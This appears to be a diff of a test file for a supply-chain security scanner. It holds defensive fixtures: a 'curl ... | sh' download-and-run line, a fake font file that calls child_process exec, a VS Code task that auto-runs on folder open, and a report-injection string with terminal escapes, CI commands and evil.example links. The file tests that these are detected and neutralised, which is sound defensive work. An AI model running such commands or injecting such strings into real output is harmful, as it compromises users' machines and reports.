@@ -1,6 +1,7 @@
 """Supply-chain detection: unit tests per detector + an offline end-to-end `check`."""
 
 import json
+import re
 from pathlib import Path
 
 import httpx
@@ -10,7 +11,7 @@ from fakes import FakeInternet, scenario
 from oss_pulse.check import render_markdown, run_check
 from oss_pulse.ingest.dependencies import parse_dependency_file, resolve_repo
 from oss_pulse.ingest.github_api import API, GitHubClient, tag_versions
-from oss_pulse.scan import run_scan
+from oss_pulse.scan import ScanResult, render_scan_markdown, run_scan
 from oss_pulse.supplychain.code_scan import scan_file
 from oss_pulse.supplychain.typosquat import _bundled, damerau_levenshtein, find_lookalike
 from oss_pulse.supplychain.workflows import scan_workflow
@@ -164,7 +165,7 @@ def test_scan_repository_catches_fake_interview_assignment(tmp_path: Path):
     (repo / "public" / "font.woff2").write_text("const s = require('child_process'); s.exec(x)")
     (repo / "requirements.txt").write_text("reqeusts==1.0\nnumpy\n")
 
-    findings = run_scan(repo)
+    findings = run_scan(repo).findings
     got = {f.rule_id for f in findings}
     assert {
         "AUTO-VSCODE",
@@ -177,12 +178,99 @@ def test_scan_repository_catches_fake_interview_assignment(tmp_path: Path):
     assert findings[0].severity == "critical"
 
 
-def test_scan_clean_repo_and_ignore_file(tmp_path: Path):
-    (tmp_path / "app.py").write_text("print('hello')\n")
-    (tmp_path / "notes.sh").write_text("curl https://example.invalid/x | sh\n")
-    assert {f.rule_id for f in run_scan(tmp_path)} == {"CODE-DLEXEC"}
-    (tmp_path / ".osspulseignore").write_text("notes.sh\n")
-    assert run_scan(tmp_path) == []
+def test_scan_clean_repo_and_user_ignore_file(tmp_path: Path):
+    repo = tmp_path / "repo"
+    repo.mkdir()
+    (repo / "app.py").write_text("print('hello')\n")
+    (repo / "notes.sh").write_text("curl https://example.invalid/x | sh\n")
+    assert {f.rule_id for f in run_scan(repo).findings} == {"CODE-DLEXEC"}
+
+    reviewed = tmp_path / "reviewed.txt"  # the user's own file, outside the scanned folder
+    reviewed.write_text("# reviewed 2026-11-04\nnotes.sh\n")
+    result = run_scan(repo, ignore_file=reviewed)
+    assert result.findings == []
+    assert [f.rule_id for f in result.suppressed] == ["CODE-DLEXEC"]
+    assert "1 findings suppressed by `reviewed.txt`: CODE-DLEXEC ×1" in render_scan_markdown(result)
+
+
+def test_planted_ignore_file_cannot_hide_findings(tmp_path: Path):
+    """A take-home that ships `.osspulseignore` containing `*` must not come out green."""
+    repo = tmp_path / "take-home"
+    (repo / ".vscode").mkdir(parents=True)
+    task = {"label": "setup", "command": "echo hi", "runOptions": {"runOn": "folderOpen"}}
+    (repo / ".vscode" / "tasks.json").write_text(json.dumps({"tasks": [task]}))
+    (repo / ".osspulseignore").write_text("*\n")
+
+    result = run_scan(repo)
+    got = {f.rule_id: f for f in result.findings}
+    assert "AUTO-VSCODE" in got and result.suppressed == []
+    assert got["EVADE-IGNORE"].severity == "high"
+    assert "would have hidden 1" in got["EVADE-IGNORE"].detail
+
+    # Your own repository: pass the file explicitly and it applies, with no evasion finding.
+    own = run_scan(repo, ignore_file=repo / ".osspulseignore")
+    assert own.findings == [] and {f.rule_id for f in own.suppressed} == {"AUTO-VSCODE"}
+
+    # A harmless ignore file in someone else's folder is still mentioned, at low severity.
+    (repo / ".osspulseignore").write_text("docs/\n")
+    assert {f.rule_id: f.severity for f in run_scan(repo).findings}["EVADE-IGNORE"] == "low"
+
+
+HOSTILE = (
+    "\x1b[2J\x1b[1A\x1b]52;c;cHduZWQ=\x07 ok\n::error::fake | cell ` tick "
+    "[click](https://evil.example) ![x](https://evil.example/p.png) <img src=x> "
+    "@acme/security \u202eevil\u200b"
+)
+
+
+def test_untrusted_text_cannot_inject_into_reports(tmp_path: Path):
+    """Evidence and file names come from the code under inspection: no terminal escapes,
+    no CI workflow commands, no Markdown links/images/HTML/mentions in the PR comment."""
+    from oss_pulse.check import CheckResult
+    from oss_pulse.supplychain.findings import Finding
+
+    hostile = Finding(
+        target=HOSTILE,
+        target_type="repository",
+        detector="repo_scan",
+        rule_id="CODE-HIDDEN",
+        severity="high",
+        category="malicious-code",
+        title="Code hidden off-screen or in fake media files",
+        detail=HOSTILE,
+        location=HOSTILE + ":3",
+        evidence=HOSTILE,
+    )
+    scan_md = render_scan_markdown(ScanResult(tmp_path / HOSTILE, [hostile]))
+    check_md = render_markdown(
+        CheckResult(rows=[], source=HOSTILE, window_days=90, findings=[hostile.as_row()])
+    )
+    markdown_it = pytest.importorskip("markdown_it")  # ships with rich, which typer uses
+    renderer = markdown_it.MarkdownIt("commonmark", {"html": True}).enable("table")
+    for md, columns in ((scan_md, 5), (check_md, 6)):
+        assert not any(ch in md for ch in "\x1b\x07\u202e\u200e"), "control characters leaked"
+        assert not any(line.startswith("::") for line in md.splitlines()), "workflow command"
+        assert "\\x1b[2J" in md and "\\u202e" in md  # shown, not executed
+
+        html = renderer.render(md)
+        assert "evil.example" not in "".join(re.findall(r"<(?:a|img)\b[^>]*>", html))
+        assert "<img src=x>" not in html
+        outside_code = re.sub(r"<code>.*?</code>", "", html, flags=re.S)
+        assert "@acme" not in outside_code, "would ping a GitHub team"
+        rows = [r for r in re.findall(r"<tr>(.*?)</tr>", html, flags=re.S) if "CODE-HIDDEN" in r]
+        assert rows and all(r.count("<td") == columns for r in rows), "table cell broken"
+
+
+def test_md_code_survives_backticks_and_pipes():
+    from oss_pulse.safe_text import md_code, md_text, visible
+
+    assert md_code("a`b") == "``a`b``"
+    assert md_code("`x`") == "`` `x` ``"
+    assert md_code("a|b") == "`a\\|b`"
+    assert md_code("a|b", in_table=False) == "`a|b`"
+    assert visible("x\ty\nz\x00") == "x y\\nz\\x00"
+    assert visible("abcdef", limit=4) == "abc…"
+    assert md_text("[a](b) <i> @me") == "\\[a\\]\\(b\\) \\<i\\> @\u200bme"
 
 
 # ------------------------------------------------------------------ identity & metadata
